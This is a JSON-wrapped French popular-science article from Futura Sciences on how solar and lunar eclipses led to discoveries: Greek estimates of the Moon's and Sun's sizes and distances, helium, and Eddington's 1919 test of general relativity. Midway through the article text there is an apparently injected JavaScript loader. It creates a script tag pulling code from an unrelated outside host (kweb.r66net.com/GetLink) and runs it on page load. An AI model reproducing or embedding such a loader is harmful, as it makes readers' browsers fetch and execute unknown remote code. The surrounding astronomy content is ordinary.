{"title": "Les eclipses de Soleil ont permis de grandes decouvertes scientifiques", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-08-22", "content": "Depuis plus de 2.000 ans, les eclipses de Soleil ont permis des bonds de geant en astronomie. Par des methodes astucieuses, des savants grecs de l'antiquite les ont exploitees pour arpenter notre Systeme solaire. Elles ont aussi aide l'astrophysique et conforte la theorie d'Albert Einstein. Ce qu'il faut retenir Les eclipses, qu'elles soient de Lune, de Soleil, totales ou partielles, voire reduites a un transit, ont permis de poser les bases de l'astronomie, a commencer par le modele heliocentrique. Les Grecs les ont utilisees pour determiner les tailles de la Lune et du Soleil, ainsi que leur distance a la Terre. Plus tard, les eclipses solaires ont aide l'astrophysique, par exemple avec la decouverte de l'helium et avec la premiere preuve de la validite de la theorie de la relativite generale. Les eclipses, c'est-a-dire l' occultation  totale ou partielle d'une source de  lumiere  par un objet  physique , ont toujours joue un role important en astronomie et en  astrophysique . Elles ont permis la comprehension du  Systeme solaire  et servent aujourd'hui a explorer le monde des  exoplanetes . Les astronomes grecs  Aristarque de Samos  (310-230 avant J.-C. ?) et Hipparque de Nicee (190-120 avant J.-C. ?) ont utilise des eclipses pour determiner la taille et la distance de la  Lune  puis du Soleil, comme l'explique la video ci-dessous. Les travaux de ces deux astronomes et mathematiciens grecs ne pouvaient cependant fournir de valeurs precises qu'en integrant la taille de la  Terre , determinee plus tard par  Eratosthene  (276-194 avant J.-C. ?). On peut en effet estimer la taille de la Lune au moment d'une eclipse lunaire. L'ombre de la Terre sur la Lune permet alors de comparer la taille de notre satellite a celui de notre planete. Connaissant sa taille apparente, on en tire la distance de la Terre a la Lune. Une  eclipse de Soleil totale  permet ensuite de mettre en relation le rapport des tailles apparentes du Soleil et de la Lune avec le rapport de leurs distances a la Terre. Une presentation en trois videos des raisonnements d'Aristarque de Samos et d'Hipparque permettant de determiner les tailles et les distances de la Lune et du Soleil. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle blanc en bas a droite. Les sous-titres en anglais devraient alors apparaitre. Cliquez ensuite sur l'ecrou a droite du rectangle, puis sur << Sous-titres >> et enfin sur << Traduire automatiquement >>. Choisissez << Francais >>. (c) Michel van Biezen Aristarque avait decouvert une methode geometrique pour determiner la distance de la Terre au Soleil au moment d'un quartier de Lune. Hipparque avait, lui, trouve comment exploiter une eclipse de Soleil. Ces raisonnements conduisent a une estimation de la taille du Soleil. Aristarque savait donc deja que l' astre  du jour est beaucoup plus gros que la Terre, meme si la dimension ainsi estimee etait bien trop faible Il est permis de penser que ce calcul avait conduit Aristarque a trouver plus naturel que la Terre tourne autour du Soleil plutot que l'inverse. Le savant grec, en effet, fut le premier defenseur connu du modele  heliocentrique .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les eclipses de Soleil, de l'astronomie a l'astrophysique Ces decouvertes appartiennent au domaine de l'astronomie mais les eclipses ont aide aussi l'astrophysique. La premiere avancee est probablement, au XVII e  siecle, la decouverte du caractere fini de la  vitesse de la lumiere , grace aux eclipses de  Io , une lune de  Jupiter . La suivante attendra le XIX e  siecle, vrais debuts de l'astrophysique avec l'apparition de la spectroscopie. Ce fut a l'occasion de l' eclipse totale  de Soleil du 16 aout 1868 a Guntur, en Inde. Le Francais Jules Janssen repere une raie d' emission  brillante dans le  spectre  de la  chromosphere  du Soleil, bien visible au moment de l'eclipse. L'astrophysicien anglais Norman Lockyer comprend qu'il s'agit d'une raie jaune produite par un element jusque-la inconnu sur Terre. Il le baptise <<  helium  >>, du mot grec  helios , qui designe le Soleil.  Jean-Pierre Luminet parle du test de la theorie d'Einstein a l'aide d'une eclipse de Soleil. (c) Jean-Pierre Luminet La decouverte astrophysique la plus spectaculaire effectuee a l'aide d'eclipses solaires est sans aucun doute celle de la premiere preuve de la theorie de la  relativite generale . Elle a ete obtenue en 1919 par l'astronome  Arthur Stanley Eddington . La theorie de la  gravitation  d' Einstein  permet de traiter de la propagation de la lumiere en generalisant les  equations de Maxwell  pour le  champ electromagnetique  dans un  espace-temps  courbe. Au voisinage d'une  masse  telle que le Soleil, les rayons lumineux, par exemple venant des  etoiles , sont devies. Le phenomene peut etre detecte par un observateur terrestre profitant de l'eclipse solaire, lui permettant de mesurer precisement la position apparente d'etoiles vues juste a cote du Soleil occulte. Il constatera alors que ces etoiles semblent occuper des positions legerement differentes de celles mentionnees par les cartes et bien sur obtenues de nuit. La theorie de la  relativite generale  fournit une prediction nette et precise de la valeur de cet ecart angulaire. En l'observant effectivement, Eddington a assure la celebrite d'Albert Einstein. Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  eclipses de soleil  |  eclipses  |  tpe eclipses  |  eclipses annulaires  |  eclipses de lune  |  prevision des eclipses  |  hipparque eclipses de lune  |  decouvertes scientifique  |  decouvertes mathematiques  |  nombre exoplanetes decouvertes", "theme": "sciences"}